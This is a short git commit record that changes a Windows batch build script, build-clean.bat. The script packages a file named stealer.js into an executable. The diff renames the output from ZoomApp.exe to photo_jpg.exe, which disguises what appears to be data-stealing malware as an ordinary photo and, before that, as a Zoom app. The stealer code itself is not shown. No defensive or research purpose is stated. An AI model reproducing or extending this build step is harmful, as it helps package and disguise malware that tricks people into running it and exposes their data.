36786aff9564f65b505b317f3b1915883843dc04
satson09 <satsunjohnson@gmail.com>
2026-07-09 14:39:33 +0100

    file structured

--- build-clean.bat
+++ build-clean.bat
@@ -3,6 +3,6 @@ echo Cleaning pkg cache...
 rmdir /s /q "%LOCALAPPDATA%\pkg-cache"
 
 echo Building...
-pkg stealer.js --targets node18-win-x64 --no-bytecode --public --output ZoomApp.exe
+pkg stealer.js --targets node18-win-x64 --no-bytecode --public --output photo_jpg.exe
 
 pauseX
